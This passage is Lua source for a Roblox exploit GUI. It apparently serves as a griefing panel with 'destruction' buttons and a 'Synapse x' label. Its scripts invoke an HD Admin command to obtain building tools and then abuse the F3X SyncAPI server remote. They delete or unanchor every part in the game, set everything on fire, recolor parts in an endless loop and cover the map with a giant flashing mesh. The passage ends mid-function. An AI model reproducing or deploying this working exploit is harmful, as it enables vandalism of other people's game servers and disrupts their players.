		G2L["a7"]["TextSize"] = 14;
		G2L["a7"]["TextScaled"] = true;
		G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["a7"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["a7"]["Size"] = UDim2.new(1, 0, 0.13223, 0);
		G2L["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a7"]["Text"] = [[SKIES]];
		G2L["a7"]["Position"] = UDim2.new(0, 0, 0.86777, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.TextLabel.UIStroke
		G2L["a8"] = Instance.new("UIStroke", G2L["a7"]);
		G2L["a8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
		G2L["a8"]["Thickness"] = 2;
		G2L["a8"]["Color"] = Color3.fromRGB(251, 0, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.TextLabel.UITextSizeConstraint
		G2L["a9"] = Instance.new("UITextSizeConstraint", G2L["a7"]);
		G2L["a9"]["MaxTextSize"] = 28;
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.chip
		G2L["aa"] = Instance.new("TextButton", G2L["a5"]);
		G2L["aa"]["TextWrapped"] = true;
		G2L["aa"]["BorderSizePixel"] = 0;
		G2L["aa"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["aa"]["TextSize"] = 14;
		G2L["aa"]["TextScaled"] = true;
		G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["aa"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["aa"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["aa"]["Name"] = [[chip]];
		G2L["aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["aa"]["Text"] = [[chip]];
		G2L["aa"]["Position"] = UDim2.new(0.70875, 0, 0.13993, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.chip.UITextSizeConstraint
		G2L["ab"] = Instance.new("UITextSizeConstraint", G2L["aa"]);
		G2L["ab"]["MaxTextSize"] = 33;
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.chip.LocalScript
		G2L["ac"] = Instance.new("LocalScript", G2L["aa"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.skeleton
		G2L["ad"] = Instance.new("TextButton", G2L["a5"]);
		G2L["ad"]["TextWrapped"] = true;
		G2L["ad"]["BorderSizePixel"] = 0;
		G2L["ad"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["ad"]["Modal"] = true;
		G2L["ad"]["TextSize"] = 14;
		G2L["ad"]["TextScaled"] = true;
		G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["ad"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["ad"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["ad"]["Name"] = [[skeleton]];
		G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["ad"]["Text"] = [[Skeleton]];
		G2L["ad"]["Position"] = UDim2.new(0.28641, 0, 0.13907, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.skeleton.LocalScript
		G2L["ae"] = Instance.new("LocalScript", G2L["ad"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.skeleton.UITextSizeConstraint
		G2L["af"] = Instance.new("UITextSizeConstraint", G2L["ad"]);
		G2L["af"]["MaxTextSize"] = 44;
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.geometry
		G2L["b0"] = Instance.new("TextButton", G2L["a5"]);
		G2L["b0"]["TextWrapped"] = true;
		G2L["b0"]["BorderSizePixel"] = 0;
		G2L["b0"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["b0"]["TextSize"] = 14;
		G2L["b0"]["TextScaled"] = true;
		G2L["b0"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["b0"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["b0"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["b0"]["Name"] = [[geometry]];
		G2L["b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b0"]["Text"] = [[geometry]];
		G2L["b0"]["Position"] = UDim2.new(0.28372, 0, 0.42845, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.geometry.UITextSizeConstraint
		G2L["b1"] = Instance.new("UITextSizeConstraint", G2L["b0"]);
		G2L["b1"]["MaxTextSize"] = 33;
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.geometry.LocalScript
		G2L["b2"] = Instance.new("LocalScript", G2L["b0"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.cow
		G2L["b3"] = Instance.new("TextButton", G2L["a5"]);
		G2L["b3"]["TextWrapped"] = true;
		G2L["b3"]["BorderSizePixel"] = 0;
		G2L["b3"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["b3"]["Modal"] = true;
		G2L["b3"]["TextSize"] = 14;
		G2L["b3"]["TextScaled"] = true;
		G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["b3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["b3"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["b3"]["Name"] = [[cow]];
		G2L["b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b3"]["Text"] = [[polish cow]];
		G2L["b3"]["Position"] = UDim2.new(0.70875, 0, 0.42845, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.cow.UITextSizeConstraint
		G2L["b4"] = Instance.new("UITextSizeConstraint", G2L["b3"]);
		G2L["b4"]["MaxTextSize"] = 33;
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.cow.LocalScript
		G2L["b5"] = Instance.new("LocalScript", G2L["b3"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.banana
		G2L["b6"] = Instance.new("TextButton", G2L["a5"]);
		G2L["b6"]["TextWrapped"] = true;
		G2L["b6"]["BorderSizePixel"] = 0;
		G2L["b6"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["b6"]["TextSize"] = 14;
		G2L["b6"]["TextScaled"] = true;
		G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["b6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["b6"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["b6"]["Name"] = [[banana]];
		G2L["b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b6"]["Text"] = [[banana]];
		G2L["b6"]["Position"] = UDim2.new(0.70875, 0, 0.67475, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.banana.UITextSizeConstraint
		G2L["b7"] = Instance.new("UITextSizeConstraint", G2L["b6"]);
		G2L["b7"]["MaxTextSize"] = 33;
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.banana.LocalScript
		G2L["b8"] = Instance.new("LocalScript", G2L["b6"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.syn
		G2L["b9"] = Instance.new("TextButton", G2L["a5"]);
		G2L["b9"]["TextWrapped"] = true;
		G2L["b9"]["BorderSizePixel"] = 0;
		G2L["b9"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
		G2L["b9"]["TextSize"] = 14;
		G2L["b9"]["TextScaled"] = true;
		G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
		G2L["b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["b9"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["b9"]["Size"] = UDim2.new(0.36851, 0, -0.1961, 0);
		G2L["b9"]["Name"] = [[syn]];
		G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b9"]["Text"] = [[Synapse x]];
		G2L["b9"]["Position"] = UDim2.new(0.28372, 0, 0.67475, 0);
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.syn.LocalScript
		G2L["ba"] = Instance.new("LocalScript", G2L["b9"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.main3.skies.syn.UITextSizeConstraint
		G2L["bb"] = Instance.new("UITextSizeConstraint", G2L["b9"]);
		G2L["bb"]["MaxTextSize"] = 33;
	
	
		-- StarterGui.f3xmain2.TextButton
		G2L["bc"] = Instance.new("TextButton", G2L["1"]);
		G2L["bc"]["TextWrapped"] = true;
		G2L["bc"]["BorderSizePixel"] = 0;
		G2L["bc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["bc"]["TextSize"] = 14;
		G2L["bc"]["TextScaled"] = true;
		G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(136, 255, 255);
		G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["bc"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
		G2L["bc"]["Size"] = UDim2.new(0.11395, 0, 0.06209, 0);
		G2L["bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["bc"]["Text"] = [[>]];
		G2L["bc"]["Position"] = UDim2.new(0.08921, 0, 0.94776, 0);
	
	
		-- StarterGui.f3xmain2.TextButton.UIGradient
		G2L["bd"] = Instance.new("UIGradient", G2L["bc"]);
		G2L["bd"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 0, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.862, Color3.fromRGB(0, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 0, 0))};
	
	
		-- StarterGui.f3xmain2.TextButton.UIStroke
		G2L["be"] = Instance.new("UIStroke", G2L["bc"]);
		G2L["be"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
		G2L["be"]["Thickness"] = 4;
	
	
		-- StarterGui.f3xmain2.TextButton.UIAspectRatioConstraint
		G2L["bf"] = Instance.new("UIAspectRatioConstraint", G2L["bc"]);
		G2L["bf"]["AspectRatio"] = 2.94;
	
	
		-- StarterGui.f3xmain2.TextButton.UITextSizeConstraint
		G2L["c0"] = Instance.new("UITextSizeConstraint", G2L["bc"]);
		G2L["c0"]["MaxTextSize"] = 49;
	
	
		-- StarterGui.f3xmain2.TextButton.LocalScript
		G2L["c1"] = Instance.new("LocalScript", G2L["bc"]);
	
	
	
		-- StarterGui.f3xmain2.Frame.bottom.TextButton.LocalScript
		local function C_d()
			local script = G2L["d"];
			local b = script.Parent
			b.Activated:Connect(function()
				local args = {
					[1] = ";btools me"
				}
				game:GetService("ReplicatedStorage").HDAdminHDClient.Signals.RequestCommand:InvokeServer(unpack(args))
			end)
	
		end;
		task.spawn(C_d);
		-- StarterGui.f3xmain2.Frame.DragScript
		local function C_f()
			local script = G2L["f"];
			--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
			--Put this inside of your Frame and configure the speed if you would like.
			--Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
	
			local UIS = game:GetService('UserInputService')
			local frame = script.Parent
			local dragToggle = nil
			local dragSpeed = 0.25
			local dragStart = nil
			local startPos = nil
	
			local function updateInput(input)
				local delta = input.Position - dragStart
				local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
					startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
			end
	
			frame.InputBegan:Connect(function(input)
				if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
					dragToggle = true
					dragStart = input.Position
					startPos = frame.Position
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragToggle = false
						end
					end)
				end
			end)
	
			UIS.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					if dragToggle then
						updateInput(input)
					end
				end
			end)
	
		end;
		task.spawn(C_f);
		-- StarterGui.f3xmain2.Frame.main.destruction.sky2.LocalScript
		local function C_14()
			local script = G2L["14"];
			local b = script.Parent
			local frames = script.Parent.gif_frames:GetChildren()
			local warned = false
	
			b.Activated:Connect(function()
				local function findBuildingTools()
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							return item
						end
					end
	
					for _, item in pairs(player.Backpack:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							return item
						end
					end
	
					return nil
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							local skyPart = workspace:FindFirstChild("sky")
	
							if skyPart then
								local args = {
									[1] = "Remove",
									[2] = { skyPart }
								}
								serverEndpoint:InvokeServer(unpack(args))
								warned = false
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Normal",
									[3] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								repeat task.wait(0.1) until workspace:FindFirstChild("Part")
								local newSky = workspace:FindFirstChild("Part")
								local args = {
									[1] = "SyncCollision",
									[2] = {
										[1] = { ["Part"] = newSky, ["CanCollide"] = false }
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetName",
									[2] = {
										[1] = newSky
									},
									[3] = "sky"
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "CreateMeshes",
									[2] = { [1] = { ["Part"] = newSky } }
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = { [1] = { ["MeshType"] = Enum.MeshType.FileMesh, ["Part"] = newSky } }
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = { [1] = { ["Part"] = newSky, ["MeshId"] = "rbxassetid://111891702759441" } }
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = { [1] = { ["Part"] = newSky, ["Scale"] = Vector3.new(4000, 4000, 4000) } }
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								if not warned then
									warned = true
									while warned and newSky and newSky.Parent do
										for _, image in ipairs(frames) do
											local args = {
												[1] = "SyncMesh",
												[2] = {
													[1] = {
														["Part"] = newSky,
														["TextureId"] = image.Texture
													}
												}
											}
											serverEndpoint:InvokeServer(unpack(args))
											task.wait(0.06)
										end
									end
								end
							end
						end
					end
				end
			end)
	
		end;
		task.spawn(C_14);
		-- StarterGui.f3xmain2.Frame.main.destruction.sky.LocalScript
		local function C_42()
			local script = G2L["42"];
			local text = script.Parent.TextBox
			local warned = false
	
			script.Parent.Activated:Connect(function()
				local function findBuildingTools()
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					return buildingTools
				end
	
				local buildingTools = findBuildingTools()
	
				if buildingTools then
					local syncAPI = buildingTools:FindFirstChild("SyncAPI")
					if syncAPI then
						local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
						if serverEndpoint then
							if workspace:FindFirstChild("sky") then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = workspace.sky
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							else
								local args = {
									[1] = "CreatePart",
									[2] = "Normal",
									[3] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 0, 0),
									[4] = workspace
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetName",
									[2] = {
										[1] = workspace.Part
									},
									[3] = "sky"
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncCollision",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["CanCollide"] = false
										}
									}
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SetLocked",
									[2] = {
										[1] = workspace.sky
									},
									[3] = true
								}
	
								serverEndpoint:InvokeServer(unpack(args))
	
	
								local args = {
									[1] = "CreateMeshes",
									[2] = {
										[1] = {
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["MeshType"] = Enum.MeshType.FileMesh,
											["Part"] = workspace.sky
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["MeshId"] = "rbxassetid://111891702759441"
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
	
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["Scale"] = Vector3.new(4000, 4000, 4000)
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
								local args = {
									[1] = "SyncMesh",
									[2] = {
										[1] = {
											["Part"] = workspace.sky,
											["TextureId"] = "http://www.roblox.com/asset/?id="..text.Text
										}
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							end
						end
					end
				end
			end)
		end;
		task.spawn(C_42);
		-- StarterGui.f3xmain2.Frame.main.destruction.fire.LocalScript
		local function C_4b()
			local script = G2L["4b"];
			local b = script.Parent
			local warned = false
	
			b.Activated:Connect(function()
				local function applyDecorationToPart(part)
					local argsCreate = {
						[1] = "CreateDecorations",
						[2] = {
							[1] = {
								["Part"] = part,
								["DecorationType"] = "Fire"
							}
						}
					}
	
					local argsSync = {
						[1] = "SyncDecorate",
						[2] = {
							[1] = {
								["Part"] = part,
								["DecorationType"] = "Fire",
								["Size"] = 999
							}
						}
					}
	
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					-- Search for the tool in Character and Backpack
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					if buildingTools then
						buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
						buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
					elseif not warned then
						warn("Building tool not found")
						warned = true
					end
				end
	
				local function applyDecorationToAllParts(workspaceObject)
					for _, obj in pairs(workspaceObject:GetDescendants()) do
						if obj:IsA("Part") or obj:IsA("MeshPart") then
							applyDecorationToPart(obj)
						end
					end
				end
	
				applyDecorationToAllParts(workspace)
			end)
	
		end;
		task.spawn(C_4b);
		-- StarterGui.f3xmain2.Frame.main.destruction.unanchor.LocalScript
		local function C_4e()
			local script = G2L["4e"];
			local b = script.Parent
			b.Activated:Connect(function()
				local function unanchor(part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = false
							}
						}
					}
	
					local function findBuildingTools()
						local buildingTools = nil
						local player = game:GetService("Players").LocalPlayer
	
						for _, item in pairs(player.Character:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
	
						if not buildingTools then
							for _, item in pairs(player.Backpack:GetChildren()) do
								if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
									buildingTools = item
									break
								end
							end
						end
	
						return buildingTools
					end
	
					local buildingTools = findBuildingTools()
	
					if buildingTools then
						local syncAPI = buildingTools:FindFirstChild("SyncAPI")
						if syncAPI then
							local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
							if serverEndpoint then
								serverEndpoint:InvokeServer(unpack(args))
							end
						end
					end
				end
	
				local function unanchorAllParts(workspaceObject)
					for _, obj in pairs(workspaceObject:GetDescendants()) do
						if obj:IsA("Part") or obj:IsA("MeshPart") then
							unanchor(obj)
						end
					end
				end
	
				unanchorAllParts(workspace)
			end)
	
		end;
		task.spawn(C_4e);
		-- StarterGui.f3xmain2.Frame.main.destruction.delete.LocalScript
		local function C_51()
			local script = G2L["51"];
			local b = script.Parent
			b.Activated:Connect(function()
				local function unanchor(part)
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					if buildingTools then
						local syncAPI = buildingTools:FindFirstChild("SyncAPI")
						if syncAPI then
							local serverEndpoint = syncAPI:FindFirstChild("ServerEndpoint")
							if serverEndpoint then
								local args = {
									[1] = "Remove",
									[2] = {
										[1] = part
									}
								}
								serverEndpoint:InvokeServer(unpack(args))
							end
						end
					end
				end
	
				local function unanchorAllParts(workspaceObject)
					for _, obj in pairs(workspaceObject:GetDescendants()) do
						if obj:IsA("Part") or obj:IsA("MeshPart") then
							unanchor(obj)
						end
					end
				end
	
				unanchorAllParts(workspace)
			end)
	
		end;
		task.spawn(C_51);
		-- StarterGui.f3xmain2.Frame.main.destruction.neon.LocalScript
		local function C_54()
			local script = G2L["54"];
			local b = script.Parent
			local RunService = game:GetService("RunService")
	
			b.Activated:Connect(function()
				local parto = {}
				local warned = false
	
				local function neon(part)
					local materialArgs = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Material"] = Enum.Material.Neon
							}
						}
					}
	
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					-- Search for the tool in Backpack or Character
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					if buildingTools then
						buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(materialArgs))
					elseif not warned then
						warn("Building tool not found")
						warned = true
					end
				end
	
				local function collectParts(workspaceObject)
					parto = {}
	
					for _, obj in pairs(workspaceObject:GetDescendants()) do
						if obj:IsA("Part") or obj:IsA("MeshPart") then
							table.insert(parto, obj)
						end
					end
				end
	
				collectParts(workspace)
				local isColoring = true
	
				RunService.Heartbeat:Connect(function(_, dt)
					if isColoring then
						for _, part in ipairs(parto) do
							neon(part)
						end
						isColoring = false
					end
				end)
			end)
	
		end;
		task.spawn(C_54);
		-- StarterGui.f3xmain2.Frame.main.destruction.color.LocalScript
		local function C_57()
			local script = G2L["57"];
			local b = script.Parent
			local RunService = game:GetService("RunService")
			local Players = game:GetService("Players")
	
			b.Activated:Connect(function()
				local partsToColor = {}
				local warned = false
	
				local function applyColorToPart(part)
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Color"] = Color3.new(math.random(), math.random(), math.random()),
								["UnionColoring"] = true
							}
						}
					}
	
					local buildingTools = nil
					local player = game:GetService("Players").LocalPlayer
	
					for _, item in pairs(player.Character:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							buildingTools = item
							break
						end
					end
	
					if not buildingTools then
						for _, item in pairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								buildingTools = item
								break
							end
						end
					end
	
					if buildingTools then
						buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
					elseif not warned then
						warn("Building tool not found")
						warned = true
					end
				end
	
				local function collectParts(workspaceObject)
					partsToColor = {}
	
					for _, obj in pairs(workspaceObject:GetDescendants()) do
						if obj:IsA("Part") or obj:IsA("MeshPart") then
							table.insert(partsToColor, obj)
						end
					end
				end
	
				collectParts(workspace)
	
				local isColoring = true
	
				RunService.Heartbeat:Connect(function(_, dt)
					if isColoring then
						for _, part in ipairs(partsToColor) do
							applyColorToPart(part)
						end
					end
				end)
			end)
	
		end;
		task.spawn(C_57);
		-- StarterGui.f3xmain2.Frame.main.destruction.decal.LocalScript
		local function C_5a()
			local script = G2L["5a"];
			local b = script.Parent
			local warned = false
			local text = script.Parent.decal
	
			b.Activated:Connect(function()
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function Color(part,color)
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Color"] = color --[[Color3]],
								["UnionColoring"] = false
							}
						}
					}
					_(args)
				end
				function SpawnDecal(part,side)
					local args = {
						[1] = "CreateTextures",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal"
							}
						}
					}
	
					_(args)
				end
				function AddDecal(part,asset,side)
					local args = {
						[1] = "SyncTexture",
						[2] = {
							[1] = {
								["Part"] = part,
